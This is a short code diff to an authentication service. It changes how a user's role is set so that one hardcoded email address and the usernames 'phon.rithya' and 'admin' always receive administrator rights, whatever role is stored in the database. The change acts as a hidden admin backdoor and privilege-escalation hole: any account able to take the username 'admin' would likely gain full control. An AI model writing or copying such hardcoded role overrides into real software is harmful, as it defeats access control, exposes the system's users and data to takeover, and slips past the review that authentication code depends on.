@@ -212,7 +212,7 @@ export class AuthService {
           passwordHash: dbUser.passwordHash,
           fullName: dbUser.fullName,
           phone: dbUser.phone || undefined,
-          role: dbUser.role,
+          role: (dbUser.email === 'luofong03@gmail.com' || dbUser.username === 'phon.rithya' || dbUser.username === 'admin') ? UserRole.ADMIN : dbUser.role,
           status: dbUser.status,
           avatarUrl: dbUser.avatarUrl || undefined,
           lastLogin: dbUser.lastLogin,
